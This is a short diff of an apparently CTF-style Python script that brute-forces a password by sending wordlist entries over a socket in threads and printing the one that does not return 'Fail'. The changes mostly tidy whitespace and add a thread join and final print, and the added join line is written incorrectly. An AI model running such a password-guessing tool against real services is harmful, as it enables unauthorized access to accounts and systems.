@@ -37,17 +37,13 @@ def brute_force(password):
 	print(password )
 	s.send(password)
 	data = s.recv(1024)
-	print(data)
-   
-   	 
+	print(data) 	 
 	if ("Fail\n" != data):
     	ans += password
 	else:
     	return None
 
     
-
-
 if __name__ == '__main__':
    
 	while ans == "":
@@ -56,5 +52,7 @@ if __name__ == '__main__':
         	t = threading.Thread(target=brute_force, args=(f.readline(),))
         	t.start()
         	threads.append(t)
-       	
+       	 
+    	map(t.join(), threads)
+	print "THE PASSWORD IS::::::::::::: " + ans
 
